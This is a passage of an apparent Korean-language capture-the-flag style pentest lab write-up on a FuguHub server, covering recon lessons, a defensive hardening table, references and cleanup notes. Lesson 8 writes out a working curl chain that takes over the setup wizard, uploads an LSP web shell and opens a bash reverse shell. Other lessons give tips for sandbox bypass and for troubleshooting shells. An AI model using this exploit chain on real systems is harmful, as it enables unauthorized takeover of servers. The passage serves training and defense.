3. **"설정 마법사 미완료" 배너 = 즉시 공격 대상.** 초기 설정이 안 끝난 어플라이언스는 관리자 계정을 공격자가 선점할 수 있다. FuguHub·NAS·공유기 관리페이지·Jenkins·GitLab에서 반복되는 패턴이며 **선착순이라 발견 즉시 잡아야 한다.** 정찰을 마저 하고 돌아오면 사라질 수 있는 유일한 종류의 표면이다.

4. **`403 Forbidden`은 "볼 것 없음"이 아니다.** 인덱싱만 꺼졌을 뿐 파일은 서빙된다. 여기서는 80이 설치 디렉터리를 그대로 노출했다.

5. **확장자 목록을 2단으로 돌려라.** 1차는 언어 확장자(`php,html,jsp,aspx,lsp`)로 빠르게, **2차는 설정·데이터 확장자**(`conf,cfg,ini,env,json,yml,xml,dat,db,sql,bak,old,zip,log`)로 다시. 이 박스의 `bdd.conf`·`user.dat`은 1차 목록에 안 걸렸다.

6. **스캐너 위양성을 먼저 걸러라.** 존재할 리 없는 경로를 한 번 때려 서버의 "없음" 응답 코드를 확정하고 필터한다(`-C 302` / `-fs <길이>`). 9999 결과 50여 건이 통째로 가짜였다.

7. **401 realm 문자열은 접근제어 지도다.** `WWW-Authenticate: Basic realm="..."` 값이 갈리면 디렉터리별 인증 구성이 다르다는 뜻이다. **realm 목록에 없는 경로가 무인증 표면**이다.

8. **⚠️ 시험 금지·제한 도구를 쓰지 말고 4줄로 끝내라.** 이 유형은 Metasploit 모듈로도 유통되지만 **MSF는 시험 전체에서 1대 한정**이다. Fundamental 난이도 박스에 그 한 장을 쓰지 마라. **수동 대안**:
   ```bash
   curl -s -X POST 'http://T:8082/Config-Wizard/wizard/SetAdmin.lsp' -d 'email=a@b.c&user=admin&password=password'
   curl -s -u admin:password -T shell.lsp http://T:8082/fs/shell.lsp
   curl -s -u admin:password --data-urlencode 'c=id' http://T:8082/shell.lsp
   curl -s -u admin:password --data-urlencode 'c=setsid bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" &' http://T:8082/shell.lsp
   ```
   공개 exploit을 만나면 **읽어서 HTTP 요청 몇 개로 환원**하는 습관을 들여라. 그러면 버전이 달라도 손으로 이어갈 수 있다.

9. **업로드 RCE는 5단계로 쪼개 검증.** ① 업로드 201/204 ② GET으로 회수 ③ **무해한 산술식(`7*7`→`49`)** 으로 서버측 실행 확인 ④ `id` ⑤ 리버스셸. 한 번에 리버스셸부터 던지면 실패 원인이 5개 가설로 흩어진다.

10. **업로드 경로 ≠ 서빙 경로.** `PUT /fs/x.lsp` 는 되는데 `GET /fs/x.lsp` 는 소스를 준다. **웹 루트 경로로 다시 요청**해야 실행된다. "올렸는데 소스가 보인다"를 "실행 안 됨"으로 오독하지 마라.

11. **샌드박스는 벽이 아니라 체다.** `io.popen` 차단 → `ba.exec()`. **`pcall`(또는 각 언어의 예외 처리)로 에러를 HTTP 본문에 노출**시키고, 후보 함수를 목록으로 순회해 살아 있는 것을 찾아라. **표준 라이브러리가 잘렸다는 것은 제품 확장 API가 안 잘렸다는 힌트**다.

12. **`-d` 대신 `--data-urlencode`.** 페이로드에 `&`·공백·`>`·`'`가 들어가면 `-d`는 **`&` 지점에서 잘린다.** 리버스셸 `0>&1`이 정확히 여기 걸린다. "명령은 되는데 셸이 안 붙는다"의 1순위 용의자.

13. **`setsid ... &`로 셸을 분리하라.** 안 하면 HTTP 응답이 영영 안 돌아와 "익스가 멈춘 것처럼" 보인다. ([[Crane]])

14. **`User=root`로 도는 서비스는 그 자체가 privesc.** 셸 잡자마자 `id`부터. **이미 root면 그 뒤 열거(SUID·capability·cron)는 전부 낭비다.** `systemctl cat <서비스>` 로 `User=` 줄을 확인하는 습관도 함께.

15. **리버스셸이 안 붙을 때 점검 순서**: ① `c=id`로 RCE 자체 재확인 ② `--data-urlencode` 여부 ③ 아웃바운드 포트(**443·80·53**) ④ `bash` 존재 여부 ⑤ 리스너 확인 ⑥ **`tun0` IP를 썼는가**.

16. **`python3`가 없으면 `script -qc /bin/bash /dev/null`.** Debian은 대개 있지만 Arch·Alpine·최소 설치에는 없다. ([[Hawat]])

17. **랩 브리핑·CVE 번호를 사실로 취급하지 마라.** 이 박스는 브리핑이 8.1, 실제가 8.4였다. **CVE 번호가 아니라 메커니즘으로 검색**하라 — 시험에는 그 CVE가 안 나오고 **같은 유형**이 나온다.

---

## 8. 방어 관점

| 결함 | 왜 위험한가 | 조치 |
|---|---|---|
| **설정 마법사가 네트워크 전체에 무인증 노출** | 관리자 계정을 누구든 선점 → 전 권한 장악 | 설정 완료 전까지 **`127.0.0.1` 바인딩** 또는 **디스크의 설치 토큰 요구**(Jenkins 방식). 부팅 후 시간 창 제한도 유효 |
| 설정 상태를 **파일 존재 여부**로만 판단 | 상태를 공격자가 먼저 확정시킬 수 있다 | 설치 토큰·서명된 부트스트랩 값 등 **공격자가 만들 수 없는 근거**로 판정 |
| **WebDAV 공유 루트 = 웹 루트** | 업로드가 곧 서버측 코드 실행 | 공유 루트를 웹 루트 **밖**으로 분리. 업로드 디렉터리에서 **스크립트 실행 비활성** |
| 업로드 확장자·MIME 필터 부재 | `.lsp` 그대로 실행 | **실행 가능 확장자 거부 화이트리스트** + 저장 시 확장자 강제 변경 |
| **`fuguhub.service`의 `User=root`** | 앱 레벨 RCE가 곧바로 시스템 장악 | **전용 비특권 계정**으로 구동. `systemd`의 `User=`·`ProtectSystem=strict`·`NoNewPrivileges=yes`·`PrivateTmp=yes` 적용. **이 한 줄만 고쳤어도 root RCE가 아니라 서비스 계정 RCE에 그쳤다** |
| Lua 샌드박스에서 **`ba.exec`가 살아 있음** | `io.popen`을 지운 의미가 없어진다 | 사용자 업로드 스크립트에는 **명령 실행 계열 API 전부** 차단. 표준 라이브러리뿐 아니라 **제품 확장 API를 함께** 감사 |
| **80/tcp nginx가 설치 디렉터리를 그대로 서빙** | `bdd.conf`(경로·포트) · `user.dat`(사용자 DB) · `Config-Wizard.zip`(소스) 유출 | 문서 루트를 앱 설치 경로와 **분리**. 최소한 `.conf`·`.dat`·`.zip`·`.txt`를 **거부 규칙**으로 차단하고 autoindex 외에 **파일 접근 자체를 제한** |
| 애플리케이션 아카이브(`Config-Wizard.zip`) 공개 | 폼 필드·검증 로직이 통째로 노출 | 배포 아티팩트를 웹 루트에 두지 않는다 |
| 존재하지 않는 경로에 **302 반환** | 열거를 방해하는 듯 보이나 실익 없음 | 정확한 **404**를 반환. 위양성은 방어가 아니라 **자기 로그를 오염**시킬 뿐 |
| 관리자 계정에 **약한 비밀번호 허용** | `password`가 그대로 통과 | 최소 길이·복잡도 정책, 최초 로그인 시 변경 강제 |

---

## 9. 참고 자료

- **CVE-2023-24078** — FuguHub 8.1 인증 우회 → RCE (랩 브리핑이 안내한 번호)
  - Exploit-DB **51550**
- **CVE-2024-27697** — FuguHub 8.4 계열. **실제 실행 중이던 버전에 대응** `[가정 — 번호 대응은 문헌 기준이며 이 박스에서 PoC로 대조하지는 않았다]`
- FuguHub / Barracuda Application Server (Real Time Logic) — LSP(Lua Server Pages), `ba.*` 런타임 API
- WebDAV 메서드: RFC 4918 (`PROPFIND` · `MKCOL` · `MOVE` · `COPY` · `LOCK`)
- HTTP Basic 인증과 realm: RFC 7617
- `systemd` 서비스 하드닝: `User=` · `NoNewPrivileges=` · `ProtectSystem=` · `PrivateTmp=`
- TTY 업그레이드 대안: `script -qc /bin/bash /dev/null`

---

## 남긴 흔적 (랩 정리용)

`/var/www/html/`에 `t1.lsp`, `en.lsp`, `sh9.lsp`, `x.lsp` 업로드됨. 관리자 계정 `admin:password` 및 `/var/www/html/user.dat` 생성됨. 랩 Stop/Revert 시 전부 소멸.

> [!warning] 실전이라면 이 흔적이 문제가 된다
> - 업로드한 `.lsp` 4개는 **누구나 접근 가능한 웹 루트**에 있다. 인증도 안 걸려 있다면 **제3자가 그대로 쓸 수 있는 백도어**다.
> - `user.dat` 생성은 **되돌릴 수 없다.** 원 관리자가 설정 마법사를 열면 "이미 저장됨"을 보게 된다 — **탐지 신호**다.
> - 실무 침투 테스트라면 보고서에 **생성한 계정·업로드한 파일 목록**을 반드시 명시하고 정리 절차를 함께 제공해야 한다.

획득 자격증명: FuguHub `admin` / `password` (직접 생성). `/root/proof.txt` = `702262325fd3a55a2f23d49e0256571c`.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — **웹서버가 root로 구동되어 권한상승이 없던 동일 패턴**
- [[Crane]] — 직전 박스, 같은 컬렉션. "응답이 성공을 뜻하지 않는다" · `setsid`로 익스 멈춤 회피
- [[Levram]] · [[RubyDome]] · [[Astronaut]] — "버전 판정은 독립 근거 2개" 패턴 색인
- [[01. Pentest Foundations]] — Hub 항목
